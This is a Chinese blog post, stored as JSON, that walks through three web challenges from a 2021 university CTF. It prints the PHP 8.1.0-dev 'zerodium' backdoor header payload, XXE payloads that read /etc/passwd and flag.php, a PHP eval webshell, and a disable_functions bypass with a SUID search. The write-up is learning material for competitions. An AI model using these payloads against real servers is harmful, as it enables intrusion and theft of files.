{"title":"20210601cumtctf","uid":"a4fcadc1e196e641ac57395fa50aecae","slug":"20210601cumtctf","date":"2021-06-03T00:40:49.000Z","updated":"2022-11-20T12:37:23.295Z","comments":true,"path":"api/articles/20210601cumtctf.json","keywords":null,"cover":[],"content":"<h2 id=\"0x01web签到\"><a href=\"#0x01web签到\" class=\"headerlink\" title=\"0x01web签到\"></a>0x01web签到</h2><p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202034622.png\" alt=\"php8.0.1\"></p>\n<p>查看题目，看到“I’m the best language in the world！！！”。联想到php是世界上最好的语言，所有这题肯定和php有关。因为之前有入门赛出过类似的谜语题，当时post bxs=什么什么就出flag了，还以为这题也一样，结果传了好一会没用，后来抓包试试，查看返回包。</p>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202034256.png\" alt=\"2\"></p>\n<p>发现php版本信息，版本为php/8.1.0-dev，该版本可能存在后门。</p>\n<p><strong>php/8.1.0-dev后门漏洞</strong></p>\n<p>可以通过发送User-Agentt头来执行任意代码。</p>\n<p>示例：</p>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202034142.png\" alt=\"3\"></p>\n<p>添加<code>User-Agentt:zerodiumvar_dump(2*3);</code>发现代码被执行；接着请求<code>User-Agentt:zerodiumsystem(&quot;cat flag.php&quot;);</code> 或者<code>User-Agentt:zerodiumshow_source(&quot;flag.php&quot;);</code> 查看flag.php。</p>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202034482.png\" alt=\"4\"></p>\n<p>拿到flag</p>\n<p>tips：大佬说谜语题一般是找备份文件，挨个网页看源代码，看返回响应头</p>\n<h2 id=\"0x02别大E\"><a href=\"#0x02别大E\" class=\"headerlink\" title=\"0x02别大E\"></a>0x02别大E</h2><p><strong>xxe漏洞</strong></p>\n<p>参考文章：<a href=\"https://blog.csdn.net/zxpo/article/details/4020701\">https://blog.csdn.net/zxpo/article/details/4020701</a>（示例明显能看到实体的作用）</p>\n<p><a href=\"https://xz.aliyun.com/t/3357\">https://xz.aliyun.com/t/3357</a>（xxe漏洞/xml基础知识）</p>\n<p><a href=\"https://blog.csdn.net/qq_45521281/article/details/106112654\">https://blog.csdn.net/qq_45521281/article/details/106112654</a>一道典型的xxe ctf，和此题差不多。</p>\n<p>回到此题</p>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202035623.png\" alt=\"2.1\"></p>\n<p>抓包，post传payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!DOCTYPE ANY [\n    &lt;!ENTITY test SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;  &#x2F;&#x2F;实体定义+读取敏感文件\n]&gt;\n&lt;user&gt;&lt;username&gt;&amp;test;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202035292.png\" alt=\"2.4 \"></p>\n<p>能够读到敏感信息，试着读取flag所在文件，一般flag在flagphp,flag.txt等等。</p>\n<p>这题可查看页面源代码</p>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202035920.png\" alt=\"2.7\"></p>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202035602.png\" alt=\"2.8\"></p>\n<p>尝试访问aGludHR0.php，知道了flag在flag.php中</p>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202035768.png\" alt=\"2.6\"></p>\n<p>构建payload，读取flag.php</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!DOCTYPE ANY [\n    &lt;!ENTITY test SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;&gt;\n]&gt;\n&lt;user&gt;&lt;username&gt;&amp;test;&lt;&#x2F;username&gt;&lt;password&gt;0&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre>\n<p>base64解码就行</p>\n<h2 id=\"0x03get-shell\"><a href=\"#0x03get-shell\" class=\"headerlink\" title=\"0x03get shell\"></a>0x03get shell</h2><p>这题就写一下看学长做的一种方法吧，其它的暂时不会。</p>\n<p>用到的工具：</p>\n<p>php混淆类代码解密在线网站：<a href=\"https://www.zhaoyuanma.com/phpjm.html\">https://www.zhaoyuanma.com/phpjm.html</a>，蚁剑。</p>\n<p>看题</p>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202035682.png\" alt=\"canvas\"></p>\n<p>放在解码网站里解得</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nhighlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);\n@eval($_POST[ymlisisisiook]);\n?&gt;</code></pre>\n<p>可见是一句话木马，查看phpinfo.php，发现有些函数被禁了</p>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202036938.png\" alt=\"3.1\"></p>\n<p>其中包括system等，能够进行命令执行的函数被禁。上蚁剑绕过disable_functions。</p>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202036993.png\" alt=\"3.2\">密码为ymlisisisiook</p>\n<p>上插件，成功后编辑数据，网址后面加上.antproxy.php,密码不变</p>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202036761.png\" alt=\"3.3\"></p>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202036340.png\" alt=\"3.4\"></p>\n<p>这时候就发现能访问到上级目录了</p>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202036778.png\" alt=\"3.5\"></p>\n<p>发现flag文件，但点进去没有，说明还没有权限</p>\n<p>用suid命令<code>find / -perm -u=s -type f 2&gt;/dev/null</code>查找有权限查看文件的命令，发现有cat，然后查看/flag即可。</p>\n<p><img src=\"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202036037.png\" alt=\"3.6\"></p>\n","text":"0x01web签到 查看题目，看到“I’m the best language in the world！！！”。联想到php是世界上最好的语言，所有这题肯定和php有关。因为之前有入门赛出过类似的谜语题，当时post bxs=什么什么就出flag了，还以为这题也一样，结果传了好...","link":"","photos":[],"count_time":{"symbolsCount":"1.8k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"ctf","slug":"ctf","count":1,"path":"api/tags/ctf.json"},{"name":"web","slug":"web","count":2,"path":"api/tags/web.json"},{"name":"blog","slug":"blog","count":2,"path":"api/tags/blog.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01web%E7%AD%BE%E5%88%B0\"><span class=\"toc-text\">0x01web签到</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02%E5%88%AB%E5%A4%A7E\"><span class=\"toc-text\">0x02别大E</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03get-shell\"><span class=\"toc-text\">0x03get shell</span></a></li></ol>","author":{"name":"c1ongyan","slug":"blog-author","avatar":"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202210022256981.jpg","link":"/","description":"一个打算开始捣鼓的小白","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"马克思主义聊天室","uid":"9376667b68296aebfefe33aef15ebde9","slug":"马克思主义聊天室","date":"2021-11-25T02:54:54.000Z","updated":"2022-11-29T12:54:33.392Z","comments":true,"path":"api/articles/马克思主义聊天室.json","keywords":null,"cover":null,"text":"趣味马克思主义聊天室——马原结课趣味设计实现功能：趣味对话具体代码：package main import ( &quot;bufio&quot; &quot;fmt&quot; &quot;io&quot; &quot;math&#x2F;rand&quot; &quot;os...","link":"","photos":[],"count_time":{"symbolsCount":"60k","symbolsTime":"54 mins."},"categories":[],"tags":[{"name":"GO","slug":"GO","count":1,"path":"api/tags/GO.json"}],"author":{"name":"c1ongyan","slug":"blog-author","avatar":"https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202210022256981.jpg","link":"/","description":"一个打算开始捣鼓的小白","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{}}